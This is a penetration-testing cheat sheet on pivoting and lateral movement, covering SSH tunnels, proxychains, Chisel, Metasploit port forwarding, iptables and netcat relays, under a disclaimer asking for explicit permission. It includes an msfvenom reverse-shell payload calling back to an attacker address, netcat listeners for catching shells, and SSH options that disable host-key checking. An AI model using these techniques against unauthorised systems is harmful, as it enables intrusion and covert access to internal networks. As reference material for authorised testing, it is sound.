# Pivoting/Lateral Movement

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

{% hint style="danger" %}
Not much here yet...please feel free to contribute at [my GitHub page](https://github.com/zweilosec/Infosec-Notes).
{% endhint %}

## SSH Tunneling 101

<pre class="language-bash"><code class="lang-bash"># SSH local port forward to reach  an_internal_server_ip:port via server_ip
ssh tunneler@server_ip -p 2222 -L 1234:an_internal_server_ip:80 
# Now curl localhost:1234 will fetch an_internal_server_ip:80 which is reachable from server_ip only

# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
ssh tunneler@server_ip -p 2222 -D 1080 

# next config proxychains socks4a localhost 1080; 
proxychains curl http://any_internal_server_ip/ #was reachable from server_ip only

# ProxyJump ssh to an_internal_host via ssh server_ip
ssh -J tunneler@server_ip:2222 faruser@an_internal_host # which is only accessible from server_ip

# SSH remote port forward to send traffic back to our local port from a port of server_ip
ssh faruser@server_ip -p 2222 -L 58671:localhost:1234
# this will listen on port 58671 of server_ip and tunnel the traffic back to us on loclahost:1234; nc -nlvp 1234 to receive for example

# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
ssh -j firstuser@1st_box:2222 seconduser@2nd_box -D 1080
<strong>
</strong><strong># next config proxychains socks4a localhost 1080; 
</strong><strong>proxychains curl http://any_internal_server_ip/ #was reachable from 2nd_box only
</strong>
# bypass first time prompt when have non-interactive shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"

</code></pre>

### SSH reverse tunneling

```bash
ssh -f -N -R 8000:10.3.3.14:80 -R 4443:10.3.3.14:443 -R 33306:10.3.3.14:3306 -R 33389:10.3.3.14:3389  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@192.168.19.57

# kill with
ps -C ssh
kill -9 <pid>
```

### **If you already have an SSH session**

```bash
-R 8081:172.24.0.2:80 # (on my Kali machine listen on 8081, get it from 172.24.0.2:80)
# <KALI 10.1.1.1>:8081<------------<REMOTE 172.24.0.2>:80
# Now you can access 172.24.0.2:80, which you didn't have direct access to


-L 8083:127.0.0.1:8084 # (on your machine listen on 8083, send it to my Kali machine on 8084)
# <KALI 127.0.0.1>:8084<------------<REMOTE 10.1.1.230>:8083<------------<REMOTE X.X.X.X>:XXXX
# run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it

#For reverse shell:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.1.1.230 LPORT=8083 -f exe -o shell
#Run it on 2nd remote target to get a shell on Kali
```

### **If you don't have an SSH session**

First, SSH to your Kali from target machine

On Kali:

```bash
service ssh start 
# add a user, give it /bin/false in /etc/passwd as the login shell
ssh - -R 12345:192.168.122.228:5986 test@10.1.1.1
```

### Using Metasploit

Get meterpreter session, then:

```bash
portfwd add -l 4445 -p 4443 -r 10.1.1.1
# Use -R to make it reverse
```

## Using DYNAMIC Port Forwarding ("one port to any")

*   setup proxychains with socks5 on 127.0.0.1:1080

    * Or set up socks5 proxy on firefox

    > For nmap use `-Pn -sT` or use tcp scanner in msf

```
ssh -i bobs.key -p 2222 bob@10.10.10.123 -D1080
```

### Using Chisel

```bash
#On Kali:
./chisel server -p 8000 -reverse

#On Target:
./chisel client 10.1.1.1:8000 R:8001:127.0.0.1:1080
./chisel server -p 8001 --socks5

#On Kali:
./chisel client 127.0.0.1:8001 socks
```

### Using Metasploit

* Get meterpreter session on one of the dual homed machines
* Auto route (multi/manage/autoroute)
* Start socks proxy (auxiliary/server/socks4a)

## Forward ports using built-in firewall

### Using iptables

To set up a port forwarder using iptables run the below commands as root (or with sudo).

```bash
echo '1' > /proc/sys/net/ipv4/conf/eth0/forwarding
iptables -t nat -A PREROUTING -p tcp -i eth0 --dport $lport -j DNAT --to-destination $ip:$rport
iptables -A FORWARD -p tcp -d $ip --dport $rport -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
```

## Port Forwarding with netcat

Forward traffic using netcat and a named pipe.

```bash
mknod $mypipe p
nc -l -p $lport < $mypipe | nc $ip $rport > $mypipe
```
